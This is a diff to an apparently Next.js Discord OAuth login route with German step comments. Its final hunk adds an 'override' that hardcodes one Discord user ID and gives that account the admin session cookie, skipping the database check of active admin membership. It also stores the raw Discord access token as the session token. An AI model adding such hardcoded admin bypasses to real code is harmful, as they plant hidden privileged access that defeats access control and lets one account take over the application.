@@ -16,6 +16,7 @@ export async function GET(req: Request) {
     const CLIENT_SECRET = process.env.DISCORD_CLIENT_SECRET!;
     const REDIRECT_URI = `${process.env.NEXT_PUBLIC_APP_URL}/api/discord-auth`;
 
+    // 1️⃣ Token holen
     const tokenRes = await fetch(DISCORD_TOKEN_URL, {
       method: 'POST',
       headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
@@ -32,6 +33,7 @@ export async function GET(req: Request) {
     if (!tokenData.access_token)
       return NextResponse.redirect(process.env.NEXT_PUBLIC_APP_URL!);
 
+    // 2️⃣ User holen
     const userRes = await fetch(DISCORD_USER_URL, {
       headers: { Authorization: `Bearer ${tokenData.access_token}` },
     });
@@ -40,18 +42,22 @@ export async function GET(req: Request) {
     if (!user?.id)
       return NextResponse.redirect(process.env.NEXT_PUBLIC_APP_URL!);
 
+    // 3️⃣ DB Check
     const member = await prisma.adminBoardMember.findUnique({
       where: { discordId: user.id }
     });
 
     const isActiveAdmin = member?.status === "ACTIVE";
 
+    // 4️⃣ CRYPTIX OVERRIDE (WICHTIG)
+    const isCryptix = user.id === "1462891063202156807";
+
     const response = NextResponse.redirect(
       `${process.env.NEXT_PUBLIC_APP_URL}/login`
     );
 
     response.cookies.set(
-      isActiveAdmin ? 'admin_token' : 'user_token',
+      (isCryptix || isActiveAdmin) ? 'admin_token' : 'user_token',
       tokenData.access_token,
       {
         httpOnly: true,
